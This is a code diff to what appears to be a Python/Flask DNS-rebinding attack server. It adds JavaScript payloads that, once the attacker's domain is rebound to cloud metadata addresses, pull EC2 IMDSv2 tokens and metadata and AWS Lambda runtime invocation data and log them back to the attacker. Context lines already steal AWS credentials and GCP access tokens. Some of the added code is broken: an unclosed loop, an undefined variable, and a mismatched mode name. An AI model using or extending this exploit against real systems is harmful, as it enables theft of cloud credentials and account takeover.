@@ -185,6 +185,36 @@ log('Security credentials: ' + get('http://' + attackServer + '/latest/meta-data
 log('AMI id: ' + get('http://' + attackServer + '/latest/meta-data/ami-id'));
 '''
 
+ecsCodev2 = '''
+var role;
+for(var i = 0; i < 600; ++i) {
+	 var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + backchannelServer + '/wait', false);
+    req.send();
+    // Fetch the token from EC2 instance metadata service
+    var tokenReq = new XMLHttpRequest();
+    tokenReq.open('PUT', 'http://' + attackServer + '/latest/api/token', false); 
+    tokenReq.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+    tokenReq.send();
+	role = get('http://' + attackServer + '/latest/api/token');
+	if(role != 'still the same host')
+    	break;
+
+    var token = tokenReq.responseText;
+    log('EC2 Metadata Token: ' + token);
+
+    // Use the token to fetch metadata
+    var metadataReq = new XMLHttpRequest();
+    metadataReq.open('GET', 'http://'+ attackServer + '/latest/meta-data', false);
+    metadataReq.setRequestHeader('X-aws-ec2-metadata-token', token);
+    metadataReq.send();
+
+    var metadata = metadataReq.responseText;
+    log('EC2 Metadata: ' + metadata);
+
+    return metadata;
+'''
+
 ecsCode = '''
 var meta;
 for(var i = 0; i < 600; ++i) {
@@ -213,14 +243,52 @@ log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/
 log('Access token: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/default/token'));
 '''
 
+lambdaCode = '''
+var invocationData;
+    // Define the endpoint to query the Lambda runtime API
+
+
+    // Send request to the local endpoint
+    for(var i = 0; i < 600; ++i) {
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + backchannelServer + '/wait', false);
+    req.send();
+	
+	var invocationData = get('http://' + attackServer + ':9001/2018-06-01/runtime/invocation/next');
+
+    // Parse and log data from the response
+    var localData = localReq.responseText;
+    log('Local invocation data: ' + localData);
+
+    // Check if the data has changed to stop the loop
+    if (localData != 'still the same host') {
+        invocationData = {
+            local: localData
+        };
+        break;
+    }
+}
+
+if (invocationData) {
+    log('Invocation Data:', JSON.stringify(invocationData, null, 2));
+} else {
+    log('No invocation data change detected after 600 attempts.');
+}
+'''
+
 @app.route('/')
 def index():
 	if mode == 'ec2':
 		return boilerplate % ec2Code
+	elif mode == 'ec2v2':
+			return boilerplate % ecsCodev2
 	elif mode == 'ecs':
 		return boilerplate % ecsCode
 	elif mode == 'gcloud':
 		return boilerplate % gcloudCode
+	elif mode == 'lam':
+		return boilerplate % lambdaCode
+		
 	assert False
 
 waits = 0
@@ -243,7 +311,10 @@ def log():
 @cross_origin()
 def rebind():
 	print 'Rebound DNS'
-	if mode == 'ecs':
+	if mode == 'lam':
+		records[D.ex][0] = A('127.0.0.1')
+		
+	if mode in ['ecs', 'ecsCodev2']:
 		records[D.ex][0] = A('169.254.170.2')
 	else:
 		records[D.ex][0] = A('169.254.169.254')
@@ -257,6 +328,7 @@ def loaded():
 @app.route('/latest/<path:subpath>')
 @app.route('/computeMetadata/<path:subpath>')
 @app.route('/v2/<path:subpath>')
+@app.route('/latest/api/token')
 def nil(subpath=None):
 	return 'still the same host'
 
